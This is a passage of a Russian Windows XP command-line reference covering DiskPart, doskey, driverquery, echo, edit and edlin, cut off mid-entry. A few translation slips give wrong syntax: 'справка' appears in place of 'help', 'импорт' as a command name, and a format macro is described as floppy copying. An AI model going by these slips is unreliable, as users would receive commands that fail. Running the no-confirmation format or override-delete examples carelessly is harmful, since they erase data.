    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.
override
    Удаление всех простых томов на диске программой DiskPart. Если на диске находится половина зеркального тома, то она удаляется. Если диск входит в том RAID-5, команда delete disk override не выполняется.

delete partition

На базовом диске удаляет раздел, имеющий фокус. Нельзя удалить системный раздел, загрузочный раздел, а также любой другой раздел, содержащий активный файл подкачки или аварийную копию памяти (дамп памяти).

Внимание!
- Удаление раздела на динамическом диске может привести к удалению всех динамических томов на этом диске, в результате все данные будут удалены, а диск преобразован в базовый. Для удаления динамического тома используйте команду delete volume.

Разделы динамических дисков можно только удалять, но не создавать. Например, можно удалить неопознанный раздел, содержащий таблицу разделов GUID (GPT), на динамическом GPT-диске. Удаление этого раздела не означает, что полученное в результате свободное пространство станет доступным. Данная команда специально предназначена для восстановления пространства поврежденного автономного динамического диска в аварийной ситуации, когда нельзя воспользоваться командой clean.
Синтаксис

delete partition [noerr] [override]
Параметры

noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.
override
    Удаление программой DiskPart любого раздела, независимо от его типа. Обычно программа DiskPart позволяет удалять только разделы с известными данными.

delete volume

Удаление выделенного тома. Нельзя удалить системный том, загрузочный том, а также любой другой том, содержащий активный файл подкачки или аварийную копию памяти (дамп памяти).
Синтаксис

delete volume [noerr]
Параметр

noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

detail disk

Вывод свойств выбранного диска и томов на этом диске.
Синтаксис

detail disk

detail volume

Отображение динамических дисков, на которых размещен текущий том.
Синтаксис

detail volume

exit

Выход из командного интерпретатора DiskPart.
Синтаксис

exit

extend

Расширение тома, имеющего фокус, на смежное невыделенное пространство. Для базовых томов невыделенная область должна находиться на том же диске и следовать (иметь более высокий сектор смещения) за разделом, имеющим фокус. Простой или составной динамический том может быть расширен на пустое место на любом динамическом диске. С помощью этой команды существующий том может быть расширен на новое, только что созданное место.

Если раздел был ранее отформатирован в файловой системе NTFS, файловая система автоматически расширяется на увеличенный раздел. Данные при этом не теряются. Если раздел был ранее отформатирован в любой файловой системе, отличной от NTFS, имеет место отказ команды без изменения раздела.

Невозможно расширить текущий системный или загрузочный разделы.
Синтаксис

extend [size=n] [disk=n] [noerr]
Параметры

size=n
    Объем в мегабайтах (Мбайт), добавляемый к текущему разделу. Если размер не указан, диск расширяется на всю смежную невыделенную область.
disk=n
    Динамический диск, на который расширяется том. На этом диске выделяется объем, равный значению size=n. Если диск не указан, том расширяется на текущий диск.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

help

Вывод списка доступных команд.
Синтаксис

справка

импорт

Импорт группы внешних дисков в группу дисков локального компьютера. Команда import импортирует каждый диск, находящийся в одной группе с диском, имеющим фокус.
Синтаксис

import [noerr]
Параметр

noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

list disk

Вывод списка дисков и таких сведений о них, как размер, свободный объем, является ли диск базовым или динамическим, а также, какой стиль раздела используется на диске — основная загрузочная запись (MBR) или таблица разделов GUID (GPT). Диск, помеченный звездочкой (*), имеет фокус.
Синтаксис

list disk

list partition

Отображение разделов, перечисленных в таблице разделов текущего диска. Для динамических дисков эти разделы могут не соответствовать динамическим томам на диске. Это различие возникает вследствие того, что динамические диски содержат записи в таблице разделов для системного тома или загрузочного тома (при наличии на диске) и раздела, занимающего остаток диска, что позволяет зарезервировать пространство используемое динамическими томами.
Синтаксис

list partition

list volume

Отображение списка базовых и динамических томов на всех дисках.
Синтаксис

list volume

online

Подключение отключенного диска или тома, на который установлен фокус.
Синтаксис

online [noerr]
Параметр

noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

rem

Добавление примечаний в сценарий.
Синтаксис

rem
Примеры

rem Эти команды устанавливают 3 драйвера.

create partition primary size=2048

assign d:

create partition extend

create partition primary size=2048

assign e:

create partition logical

assign f:

remove

Удаление буквы диска или точки подключения тома, имеющего фокус. Если используется параметр all, удаляются все текущие буквы дисков и точки подключения. Если буква диска или точка подключения не указана, команда DiskPart удаляет первую обнаруженную букву диска или точку подключения.

Команду remove можно использовать для смены буквы диска, связанной со съемным диском. Не допускается удаление буквы диска для системного и загрузочного тома, а также для тома, содержащего файл подкачки. Кроме того, не допускается удаление букв диска разделов, созданных ИВТ, любых GPT-разделов с нераспознанной таблицей GUID, а также особых, не содержащих данных GPT-разделов, таких как системные разделы EFI.
Синтаксис

remove [{letter=d|mount=путь [all]}] [noerr]
Параметры

letter=d
    Удаляемая буква диска.
mount=путь
    Удаляемый путь к точке подключения.
all
    Удаление всех текущих букв дисков и точек подключения.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

rescan

Поиск новых дисков, добавленных в компьютер.
Синтаксис

rescan

retain

Подготовка существующего динамического простого тома к использованию в качестве загрузочного или системного тома.

В компьютерах на базе процессоров x86 — создание записи раздела в основной загрузочной записи (MBR) на динамическом простом томе, имеющем фокус. Для создания раздела MBR динамический простой том должен начинаться со смещения, выровненного по цилиндру, а его размер должен равняться целому числу цилиндров.

В компьютерах на базе процессоров Itanium — создание записи раздела в таблице разделов GUID (GPT) на динамическом простом томе, имеющем фокус.

Примечание
- Команда retain предназначена для использования во время установки в автоматическом режиме или изготовителями вычислительной техники (ИВТ).
Синтаксис

retain

select disk

Выбор указанного диска и перемещение фокуса на него.
Синтаксис

select disk=[n]
Параметры

n
    Номер диска, получающего фокус. Если номер диска не указан, команда select отображает текущий диск, имеющий фокус. Чтобы просмотреть номера всех дисков в компьютере, воспользуйтесь командой list disk.

select partition

Выбор указанного раздела и передача ему фокуса. Если раздел не указан, команда select отображает текущий раздел, имеющий фокус. Чтобы просмотреть номера всех разделов в компьютере, воспользуйтесь командой list partition.
Синтаксис

select partition=[{n|d}]
Параметры

n
    Номер раздела, получающего фокус.
d
    Буква диска или точка подключения раздела, получающие фокус.

select volume

Выбор указанного тома и перемещение фокуса на него. Если том не указан, команда select отображает текущий том, имеющий фокус. Пользователь может указать том по номеру, букве диска или пути к точке подключения. На базовом диске при выборе тома фокус переводится на соответствующий раздел. Чтобы просмотреть номера всех томов в компьютере, воспользуйтесь командой list volume.
Синтаксис

select volume=[{n|d}]
Параметры

n
    Номер тома, получающего фокус.
d
    Буква диска или точка подключения тома, получающие фокус.

Создание сценариев с помощью программы DiskPart

С помощью DiskPart можно создавать сценарии для автоматизации задач по работе с дисками, таких как создание томов или преобразование дисков в динамические. Составление сценариев этих задач полезно, если система Windows устанавливается с помощью автоматического режима или программы Sysprep, которые не поддерживают создание томов, за исключением загрузочного тома.

Чтобы запустить сценарий DiskPart, введите в командной строке следующую команду:

DiskPart /S имя_сценария.txt

Где имя_сценария.txt — это имя текстового файла, содержащего сценарий.

Чтобы направить вывод сценария DiskPart в файл, введите следующую команду:

DiskPart /S имя_сценария.txt > файл_журнала.txt

Где файл_журнала.txt — имя текстового файла, в который записывается вывод программы DiskPart.

При запуске DiskPart версия этой программы и имя компьютера отображаются в командной строке. По умолчанию, если при попытке выполнить задачу сценария в DiskPart возникает ошибка, обработка сценария прекращается и выводится код ошибки (если не указан параметр noerr). Однако программа DiskPart всегда возвращает коды синтаксических ошибок, независимо от использования параметра noerr. Параметр noerr позволяет выполнять такие полезные задачи, как использование одного сценария для удаления всех разделов на всех дисках, независимо от общего числа дисков.

В следующей таблице перечислены коды ошибок DiskPart.
Ошибка     Описание
0     Ошибки отсутствуют. Сценарий выполнен без ошибок.
1     Возникла фатальная ошибка. Возможны серьезные неполадки.
2     Указан неверный параметр для команды DiskPart.
3     Указанный сценарий или выходной файл не открываются в программе DiskPart.
4     Произошел сбой в одной из служб, использованной программой DiskPart.
5     Возникла синтаксическая ошибка команды. Сценарий не выполнен, поскольку объект неправильно выбран или его недопустимо использовать с данной командой.
========================================================================================
Dos

Задание в подсистеме MS-DOS поддержки связи с верхней областью памяти (UMA) или загрузки части системы в область высокой памяти (HMA).
Синтаксис

dos={high|low}[{,umb|,noumb}]

dos={[high,|low,}]{umb|noumb}
Параметры

{high|low}
    Задание загрузки части подсистемы MS-DOS в область высокой памяти HMA. Параметр high позволяет загрузить часть подсистемы MS-DOS в область HMA. Параметр low используется для загрузки всей подсистемы MS-DOS в обычную память. По умолчанию используется параметр low.
{umb|noumb}
    Задание поддержки связи между обычной памятью и областью верхней памяти в подсистеме MS-DOS. Параметр umb позволяет установить эту связь. Параметр noumb отключает связь. По умолчанию используется параметр noumb.
/?
    Отображение справки в командной строке.

Примечания
- Установка драйвера Himem.sys для команд dos=umb или dos=high

Перед использованием параметров dos=umb и dos=high должен быть установлен драйвер Himem.sys.
- Использование параметра umb

Для загрузки программ и драйверов устройств в область верхней памяти необходимо указать команду dos=umb. Это позволит высвободить дополнительное свободное пространство в обычной памяти для других программ. Кроме того, необходимо установить драйвер доступа к блоку верхней памяти (UMB).
- Использование параметра high

Если задан параметр high, подсистема MS-DOS попытается загрузить часть самой себя в область верхней памяти (HMA). Загрузка части MS-DOS в область HMA освобождает больше обычной памяти для работы программ.
- Сочетание параметров

Если задан параметр high, подсистема MS-DOS попытается загрузить часть самой себя в область верхней памяти (HMA). Загрузка части MS-DOS в область HMA позволяет высвободить обычную память для работы программ.

В одной команде dos можно использовать несколько параметров, разделяя их запятыми. Например, следующие команды являются допустимыми:

dos=umb,low
dos=high,umb

Команду dos можно указать в любом месте файла Config.nt или эквивалентного загрузочного файла.
========================================================================================
Doskey

Вызов программы Doskey.exe, которая позволяет повторно вызывать команды Windows XP, редактировать командные строки и создавать макросы.
Синтаксис

doskey {/reinstall | /listsize=размер | /macros:[{all | программа}] | /history | /insert | /overstrike | /exename=программа | /macrofile=имя_файла | имя_макроса=[текст]}
Параметры

/reinstall
    Установка новой копии программы Doskey.exe. Очистка буфера команд.
/listsize=размер
    Задание максимального количества команд, сохраняемых в буфере.
/macros
    Вывод списка всех макросов, заданных командой doskey. Для перенаправления списка в файл можно использовать символ перенаправления (>) вместе с параметром /macros. Допускается использование сокращения /m вместо /macros.
all
    Вывод макросов doskey для всех программ.
программа
    Вывод макросов doskey для заданной программы.
/history
    Вывод всех команд, сохраняемых в памяти. Для перенаправления списка в файл можно использовать символ перенаправления (>) вместе с параметром /history. Допускается использование сокращения /h вместо /history.
{/insert | /overstrike}
    Задание режима замены текста при вводе. Если используется параметр /insert, вводимый текст будет вставляться в старый (как при нажатии клавиши INSERT). При задании параметра /overstrike новый текст будет вводиться взамен старого. По умолчанию используется /overstrike.
/exename=программа
    Задание программы (т. е. исполняемого файла), в которой выполняется макрос doskey.
/macrofile=имя_файла
    Задание имени файла, содержащего макросы, которые требуется установить.
имя_макроса=[текст]
    Создание макроса, который выполняет команды, заданные параметром текст. Параметр имя_макроса задает имя, которое присваивается данному макросу. Текст задает команды, которые записываются в макрос. Если параметр текст оставлен пустым, макрос имя_макроса не будет выполнять никаких команд.
/?
    Отображение справки в командной строке.

Примечания
- Использование Doskey.exe

Программа Doskey.exe всегда доступна всем интерактивным программам, работающим в символьном режиме (таких как отладчики или программы копирования). Она поддерживает буфер выполнявшихся команд и макросы для каждой запущенной программы. Параметры командной строки doskey нельзя вызвать в программе. Эти параметры необходимо выполнить до запуска программы. Назначения комбинаций клавиш, сделанные в какой-либо программе, имеют приоритет перед назначениями команды doskey.
- Повторный вызов команд

Для повторного вызова команды можно использовать любую из нижеперечисленных клавиш. Если Doskey.exe используется в программе, клавиши, назначенные в этой программе, имеют приоритет.
Клавиша     Описание
СТРЕЛКА ВВЕРХ     Перемещение на одну команду назад в буфере команд.
DOWN ARROW     Перемещение на одну команду вперед в буфере команд.
PAGE UP     Перемещение в начало буфера команд.
PAGE DOWN     Перемещение в конец буфера команд.
- Редактирование командных строк

С помощью программы Doskey.exe можно редактировать текущую командную строку. Если Doskey.exe используется в другой программе, клавиши, заданные в этой программе, будут иметь приоритет и, возможно, не все клавиши редактирования Doskey.exe будут работать.

В следующей таблице перечислены команды редактирования doskey.
Клавиша или сочетание клавиш     Описание
СТРЕЛКА ВЛЕВО     Перемещение курсора на один символ назад.
СТРЕЛКА ВПРАВО     Перемещение курсора на один символ вперед.
CTRL + СТРЕЛКА ВЛЕВО     Перемещение курсора на одно слово назад.
CTRL + СТРЕЛКА ВПРАВО     Перемещение курсора на одно слово вперед.
HOME     Перемещение курсора в начало строки.
END     Перемещение курсора в конец строки.
ESC     Удаление всех символов командной строки.
F1     Копирование одного символа из шаблона в ту же позицию в окне командной строки. (Шаблоном является буфер памяти, в котором содержится последняя выполнявшаяся команда.)
F2     Поиск в шаблоне символа, введенного после нажатия F2. Программа Doskey.exe вставит текст из шаблона до символа, который был задан.
F3     Копирование оставшейся части шаблона в командную строку. Doskey.exe начинает копирование с позиции в шаблоне, которая соответствует позиции курсора в командной строке.
F4     Удаление символов с текущей позиции курсора до указанного символа. Чтобы использовать эту клавишу редактирования, нажмите F4 и введите символ. Doskey.exe удалит текст от текущей позиции до первого появления заданного символа.
F5     Копирование шаблона в командную строку.
F6     Вставка символа конца файла (CTRL+Z) в текущую позицию курсора.
F7     Вывод всех команд, сохраненных в памяти. Используйте клавиши СТРЕЛКА ВВЕРХ и СТРЕЛКА ВНИЗ для выбора требуемой команды и клавишу ENTER для выполнения команды. Кроме того, номер данной команды, который выводится справа от текста команды, может быть использован с клавишей F9.
ALT+F7     Удаление всех команд, сохраненных в памяти в текущем буфере.
F8     Вывод всех команд из буфера команд, начинающихся с символов текущей команды.
F9     Вывод команды, соответствующей введенному номеру в буфере команд. Для запуска команды необходимо нажать ENTER. Для вывода всех номеров и соответствующих команд используется клавиша F7.
ALT+F10     Удаление всех макросов.
- Использование doskey в программах

Некоторые интерактивные программы с символьным интерфейсом, такие как отладчики программ или программы передачи файлов (FTP), автоматически используют программу Doskey.exe. Для использования Doskey.exe программа должна быть процессом окна командной строки и использовать буферизованный ввод. Назначения комбинаций клавиш, сделанные в какой-либо программе, имеют приоритет перед назначениями команды doskey. Например, если клавиша F7 используется в программе для вызова некоторой функции, вывести содержимое буфера команд программы doskey будет невозможно.

Программа Doskey.exe поддерживает буфер команд для всех запущенных программ, что позволяет повторять и редактировать ранее вызывавшиеся из командной строки программы и запускать макросы doskey, созданные для этих программ. Если программа перезапускается в том же окне командной строки, все использованные ею команды доступны в буфере команд.

Doskey.exe необходимо запустить перед выполнением программы. Параметрами doskey нельзя воспользоваться в командной строке другой программы, даже если в ней применяются команды оболочки операционной системы.

Если требуется настроить режим работы программы Doskey.exe с какой-либо программой и создать макросы doskey для этой программы, можно создать пакетный файл, который сначала будет вызывать Doskey.exe с нужными параметрами, а затем запускать соответствующую программу.
- Задание режима вставки по умолчанию

Если нажата клавиша INSERT, текст можно вводить прямо в середину командной строки doskey без удаления предыдущего текста. Однако после нажатия клавиши ENTER режим замены восстанавливается. Для возвращения в режим вставки необходимо снова нажать INSERT.

Для переключения клавиатуры в режим вставки при нажатии клавиши ENTER используйте параметр /insert. Этот режим сохраняется до тех пор, пока не будет задан параметр /overstrike. Нажатие клавиши INSERT временно восстанавливает режим замены, но при нажатии клавиши ENTER в программе Doskey.exe устанавливается режим вставки.

Форма курсора изменяется при нажатии клавиши INSERT для смены режимов.
- Создание макросов

В программе Doskey.exe можно создавать макросы, выполняющие одну или несколько команд. В следующей таблице перечислены специальные символы, которые можно использовать для управления выполнением команд при записи макросов.
Символ     Описание
$G или $g     Перенаправление вывода. Оба эти символа могут быть использованы для направления вывода на устройство или в файл, а не на экран. Эти символы эквивалентны символу перенаправления (>).
$G$G или $g$g     Добавление вывода в конец файла. Обе эти двухсимвольные комбинации добавляют вывод к существующему файлу, а не заменяют данные в нем. Эти комбинации эквивалентны символу перенаправления вывода с добавлением (>>).
$L или $l     Перенаправление ввода. Оба эти символа используются для считывания ввода с устройства или из файла, а не с клавиатуры. Эти символы эквивалентны символу перенаправления ввода (<).
$B или $b     Направление вывода макроса другой команде. Использование этих специальных символов эквивалентно использованию канала (|) в командной строке.
$T или $t     Разделители команд. Символы используются при создании макросов или вводе команд в командной строке программы doskey. Использование этих специальных символов эквивалентно использованию амперсанда (&) в командной строке.
$$     Символ доллара ($).
$1 до $9     Символы замещения параметров командной строки при вызове макроса. Представляют собой пакетные параметры, позволяющие использовать различные данные в командной строке при каждом вызове программы. Символ $1 в программе doskey аналогичен символу %1 в пакетных программах.
$*     Содержит все параметры командной строки, заданные при вызове макроса. Специальный символ $* — это подставляемый символ, аналогичный пакетным параметрам с $1 по $9, но имеющий одно очень важное отличие: все, что введено в командной строке после имени макроса, подставляется вместо символа $* в макросе.
- Вызов макросов команды doskey

Для вызова макроса необходимо ввести его имя, начиная с первой позиции командной строки. Если в макросе используется параметр $* или какой-либо из параметров $1 – $9, вводите пробелы для разделения параметров. Вызов макросов doskey невозможен из пакетных программ.
- Создание макросов с именами, совпадающими с именами команд Windows XP

Если постоянно используется команда с определенными параметрами командной строки, можно создать макрос, имя которого будет совпадать с именем команды. Чтобы указать, что следует выполнить — макрос или команду, руководствуйтесь следующими инструкциями.
- Для вызова макроса его имя должно вводиться с первой позиции командной строки без пробелов перед ним.- Для вызова команды перед ее именем, вводимым из командной строки, следует ввести один или несколько пробелов. - Удаление макроса

Чтобы удалить макрос, введите следующую команду:

doskey имя_макроса=
Примеры

Параметры /macros и /history полезны при создании пакетных программ для сохранения макросов и команд. Например, для сохранения всех текущих макросов doskey введите следующую команду:

doskey /macros > macinit

Чтобы воспользоваться макросами из файла Macinit, введите следующую команду:

doskey /macrofile=macinit

Чтобы создать пакетную программу Tmp.bat, которая содержит ранее использованные команды, введите следующую команду:

doskey /history > tmp.bat

Чтобы создать макрос с несколькими командами, следует использовать символ $t для разделения команд:

doskey tx=cd temp$tdir/w $*

В предыдущем примере макрос TX изменяет текущий каталог на каталог Temp и выводит список каталогов в расширенном формате. Символ $* можно использовать в конце макроса для задания дополнительных параметров команды dir при вызове макроса TX.

Следующий макрос использует пакетный параметр для задания нового имени каталога.

doskey mc=md $1$tcd $1

Макрос создает каталог, а затем делает его текущим.

Чтобы использовать предыдущий макрос для создания каталога Books, введите следующую команду:

mc books

Чтобы создать макрос doskey для программы Ftp.exe, задайте параметр /exename:

doskey /exename:ftp.exe go=open 10.127.1.100$tmget *.TXT c:\reports$bye

Чтобы воспользоваться предыдущим макросом, запустите программу ftp. В командной строке программы ftp введите следующую команду:

go

Программа ftp последовательно выполнит команды open, mget и bye.

Чтобы создать макрос, который выполняет быстрое копирование гибкого диска без подтверждения, введите следующую команду:

doskey qf=format $1 /q /u

Чтобы выполнить быстрое форматирование диска в дисководе A без подтверждения, введите следующую команду:

qf a:
========================================================================================
Dosonly

Запрет запуска из командной строки Command.com программ, отличных от приложений MS-DOS.
Синтаксис

dosonly
Параметры

отсутствуют

Примечания
- Обычно при завершении работы приложения MS-DOS система Windows XP возвращает управление командному интерпретатору Cmd.exe. При вызове резидентной программы (TSR) или временной остановки приложения MS-DOS для возврата к командной строке, система Windows XP запускает Command.com — командный интерпретатор MS-DOS. Это сохраняет среду MS-DOS, позволяя работать непосредственно с резидентной программой.

Поскольку запуск других приложений из командной строки Command.com может привести к неправильной работе резидентной программы и приостановленного приложения MS-DOS, в Windows XP предусмотрена команда dosonly. Команда dosonly позволяет запускать с командной строки Command.com только исполняемые файлы MS-DOS. Команду dosonly можно поместить в файл Config.nt или в соответствующий ему специальный файл (PIF-файл) настройки приложения MS-DOS.
- Файл Config.nt используется для инициализации среды MS-DOS, если только в PIF-файле приложения не указан другой загрузочный файл.
Примеры

Включите команду dosonly в файл Config.nt или в загрузочный файл, заданный в PIF-файле. Следующий пример иллюстрирует содержимое файла Config.nt.

dos=high,umb
device=%systemroot%\system32\himem.sys
files=40
@echo off
dosonly
========================================================================================
Driverquery

Вывод списка всех установленных драйверов устройств и их свойств.
Синтаксис

driverquery [/s компьютер] [/u домен\пользователь /p пароль] [/fo {TABLE|LIST|CSV}] [/nh] [/v] [/si]
Параметры

/s компьютер
    Задание имени или IP-адреса удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, заданного в параметре пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Указание пароля учетной записи пользователя, заданной параметром /u.
/fo {TABLE|LIST|CSV}
    Задание формата вывода сведений о драйверах. Допустимые значения: TABLE, LIST и CSV. По умолчанию для выходных данных используется формат TABLE.
/nh
    Исключение столбца заголовков из отображаемых сведений о драйверах. Данный параметр является допустимым, если параметр /fo имеет значение TABLE или CSV.
/v
    Задание вывода подробных сведений о драйверах.
/si
    Вывод сведений о цифровой подписи как для подписанных, так и неподписанных драйверов устройств.
/?
    Отображение справки в командной строке.

Примеры

Далее приведены примеры использования команды driverquery:

driverquery
driverquery /fo csv
driverquery /nh
driverquery /s ipaddress
driverquery /s server1 /u hirpln /v driverquery /s server1 /u maindom\hirpln /p p@ssw3d /fo list
========================================================================================
Echo

Вывод на экран сообщения или задание режима вывода на экран сообщений команд. Вызванная без параметров команда echo выводит текущий режим.
Синтаксис

echo [{on|off}] [сообщение]
Параметры

{on|off}
    Включение или отключения режима отображения на экране информации о работе команд. 
сообщение
    Задание текста для вывода на экран.
/?
    Отображение справки в командной строке.

Примечания
- Команда echo сообщение может оказаться полезной, если отключен режим отображения работы команд. Для вывода сообщений из нескольких строк без вывода дополнительных команд между ними следует использовать несколько последовательных команд echo сообщение после команды echo off в пакетной программе.- Если используется команда echo off, приглашение командной строки не отображается на экране. Чтобы отобразить приглашение, введите команду echo on. - Чтобы отключить вывод строк, введите символ «коммерческого эт» (@) перед командой в пакетном файле. - Чтобы вывести на экране пустую строку, введите следующую команду:

echo.
- Чтобы вывести символы канала (|) или перенаправления (< или >) при использовании команды echo, введите символ (^) непосредственно перед символом канала или перенаправления (например ^>, ^< или ^| ). Чтобы вывести символ (^), введите два этих символа подряд (^^).
Примеры

Следующий пример представляет собой пакетный файл, выводящий сообщение из трех строк на экран с пустыми строками до и после него:

echo off
echo.
echo Эта пакетная программа
echo форматирует и проверяет
echo новые диски
echo.

Если требуется отключить режим отображения команд и при этом не выводить на экран строку самой команды echo, введите символ @ перед командой:

@echo off

Оператор if и команду echo можно использовать в одной командной строке: Например:

if exist *.rpt echo Отчет получен.
========================================================================================
Echoconfig

Вывод сообщений в процессе обработки файлов сведений о программах Config.nt и Autoexec.nt подсистемы MS-DOS. Если данная команда отсутствует, сообщения не выводятся.
Параметры

отсутствуют
Примечания
- Данную команду нужно указать в файле Config.nt подсистемы MS-DOS. Следующий пример иллюстрирует содержимое файла Config.nt.

dos=high,umb
device=%systemroot%\system32\himem.sys
files=40
echoconfig
========================================================================================
Edit

Запуск редактора MS-DOS, который позволяет создавать и редактировать текстовые файлы в формате ASCII. Использование данной команды без параметров приводит к запуску редактора MS-DOS.
Синтаксис

edit [[диск:][путь] имя_файла] [/b] [/g] [/h] [/nohi]
Параметры

[диск:][путь] имя_файла
    Задает местонахождение и имя текстового файла. Если файл не существует, редактор MS-DOS создаст его. Если файл существует, редактор MS-DOS откроет его и выведет содержимое на экран.
/b
    Устанавливает черно-белый режим работы редактора MS-DOS. Этот параметр следует выбирать в случае, когда редактор MS-DOS неправильно отображается на черно-белом мониторе. 
/g
    Задает режим наиболее быстрого обновления экрана при работе с монитором CGA.
/h
    Задает режим вывода максимального количества строк для используемого монитора.
/nohi
    Разрешает работу редактора MS-DOS в восьмицветном режиме. Как правило, Windows XP использует шестнадцатицветный режим.
/?
    Отображает справку в командной строке.

Примечания
- Некоторые мониторы по умолчанию не поддерживают отображение клавиш быстрого вызова. В этом случае нужно использовать ключ /b (для мониторов CGA) и ключ /nohi (для систем, не поддерживающих выделение символов на экране полужирным шрифтом). 
========================================================================================
Edlin

Запуск программы Edlin — строкового редактора, позволяющего создавать и редактировать текстовые файлы в формате ASCII.
Синтаксис

edlin [диск:][путь] имя_файла [/b]
Параметры

[диск:][путь] имя_файла
    Задает расположение и имя текстового файла на диске. Параметр имя_файла является обязательным. Если файл существует, Edlin открывает его. Если нет — файл будет создан в памяти, а заданное расположение и имя будут использованы для создания файла на диске при вызове подкоманды e редактора.
/b
    Задает игнорирование символа конца файла (CTRL+Z).
?
    Выводит список подкоманд edlin.

Примечания
- - Использование программы Edlin.exe

Все строки текстового файла, загруженного в память, нумеруются. Программа Edlin.exe позволяет осуществлять вставку, изменение, копирование, перемещение и удаление строк. Для редактирования в полноэкранном режиме используется программа edit.
- Максимальная длина строки

В программе Edlin максимально допустимая длина строки составляет 253 символа.
- Использование подкоманд edlin

Таких подкоманд существует несколько. Для получения дополнительных сведений о подкомандах edlin щелкните ссылку "".
- Использование символа звездочки

Когда в строке не присутствует других символов, кроме звездочки — это строка приглашения программы edlin для ввода подкоманд. Когда этот же символ изображен после номера строки, он указывает на то, что в данной строке расположен курсор.
- Отображение страницы текста.

Страницей считается экран, заполненный текстом. В режиме отображения 25-ти строк редактор выводит по 24 строки текста на страницу. Если используется режим с другим количеством строк на экране, количество строк на странице также будет изменено.
- Включение и отключение режима вставки

Для вставки строк в редактируемый файл используется команда i (Insert). После того как необходимое количество строк вставлено, нажмите клавишу ENTER, а затем — сочетание клавиш CTRL+C для выключения режима вставки. Для получения дополнительных сведений о вставке строк с помощью подкоманды i (insert) щелкните ссылку «».
- Клавиши редактирования

Имеется ряд клавиш, которые можно использоввать для редактирования загруженного в память файла.
========================================================================================
Edlin: a (append)

Загрузка части файла, если недостаток памяти не позволяет загрузить файл целиком. При использовании без параметров данная команда загружает строки из файла на диске до тех пор, пока память не окажется заполнена на 75%. Если 75 процентов памяти уже занято, не будет загружено ни одной строки.
Синтаксис

[число]a
Параметры

число
    Задает количество строк, которые будут загружены в память программой Edlin.
?
    Выводит список подкоманд edlin.

Примечания
- - При запуске программы Edlin в память загружается столько строк файла, сколько позволяет объем свободной памяти. Если размер файла больше, чем объем свободной памяти, файл следует редактировать в несколько этапов. Вначале редактируется первая часть файла, затем она записывается на диск с помощью подкоманды w (write), после чего загружается следующая часть файла. - После загрузки в память с помощью подкоманды a последней строки файла будет выведено следующее сообщение:

Конец входного файла
Примеры

Предположим, что последние 100 строк редактируемого файла не поместились в памяти. После внесения изменений в первую часть файла ее следует сохранить на диске. Теперь, чтобы загрузить в память оставшиеся 100 строк, введите:

100a
========================================================================================
Edlin: c (copy)

Копирует блок последовательно расположенных строк в другое место внутри редактируемого файла. Данная операция может быть выполнена несколько раз.
Синтаксис

[строка1],[строка2],строка3,[число_опер]c
Параметры

строка1
    Задает первую строку для копирования.
строка2
    Задает последнюю строку для копирования.
строка3
    Обязательный параметр. Задает номер строки назначения, перед которой будут помещены копируемые строки.
число_опер
    Задает количество операций копирования.

Примечания
- Пропуск значений параметров

Если пропущен параметр строка1 или строка2, будет скопирована только текущая строка. Если пропущен какой-либо параметр, запятые в строке вызова команды все равно должны присутствовать. Кроме того, необходимо указать номер строки назначения.

При пропуске параметра число_опер копирование выполняется один раз.
- Изменение нумерации строк

Для просмотра новой нумерации строк после копирования следует ввести подкоманду l (list) в командную строку вида *.
- Копирование с перекрытием

Номер строки, заданный параметром строка3, не может находиться внутри набора копируемых строк. В этом случае операция копирования не будет выполнена полностью и на экран будет выведено следующее сообщение:

Ошибка ввода
Примеры

Чтобы один раз скопировать строки с первой по пятую, разместив их начиная с шестой страницы, введите:

1,5,6c

В результате строки с 6 по 10 становятся такими же, как строки с 1 по 5.

Чтобы скопировать текущую строку в строку 5, введите:

,,5c

Чтобы ознакомиться с ссобщением об ошибке, возникающем при копировании с перекрытием, введите:

3,20,15c
========================================================================================
Edlin: d (delete)

Удаление заданного блока последовательно расположенных строк. При использовании без параметров команда d удаляет текущую строку.
Синтаксис

[строка1][,строка2]d
Параметры

строка1
    Задает номер первой строки для удаления.
строка2
    Задает номер последней строки для удаления.
?
    Выводит список подкоманд команды edlin.

Примечания
- Пропуск значений параметров

Если пропущен параметр строка2 или оба параметра, будет удалена текущая строка. В тоже время, если будет пропущен только параметр строка1, то удалены будут строки, начиная с текущей строки и до строки строка2. При этом значение параметра строка2 не может быть меньше, чем номер текущей строки. Число, указанное в качестве значения параметра строка2, не может быть меньше значения параметра строка1. Если пропущен только параметр строка1, необходимо вставить заменяющую его запятую перед параметром строка2, как показано в описании синтаксиса команды.
- Изменение нумерации строк

Для просмотра новой нумерации оставшихся после удаления строк следует ввести подкоманду l (list) в командную строку вида *.
Примеры

Чтобы удалить строку 7, введите:

7d

Чтобы удалить текст на участке с 22-ой по 32-ую строку, введите:

22,32d

Предположим, что строка номер 7 является текущей. Следующая команда вызовет удаление строк с текущей по одиннадцатую:

,11d
========================================================================================
Edlin: e (end)

Переименовывает исходную версию редактируемого файла на диске в резервный файл с расширением .bak, заменяя ее версией в текущей редакции и заканчивает работу программы.
Синтаксис

e
Параметры

